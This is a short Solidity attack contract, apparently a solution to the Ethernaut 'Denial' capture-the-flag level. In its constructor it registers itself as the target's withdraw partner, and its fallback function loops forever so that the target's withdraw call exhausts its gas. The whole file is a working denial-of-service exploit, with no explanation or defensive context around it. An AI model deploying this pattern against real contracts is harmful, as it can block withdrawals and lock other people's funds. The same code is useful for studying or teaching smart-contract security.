// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

interface IDenial {
    function setWithdrawPartner(address _partner) external;

    function withdraw() external;
}

contract HDenial {
    IDenial public victim;

    constructor(address _victim) public {
        victim = IDenial(_victim);
        victim.setWithdrawPartner(address(this));
    }

    function initiateHack() public {
        victim.withdraw();
    }

    fallback() external payable {
        while (true) {}
    }
}
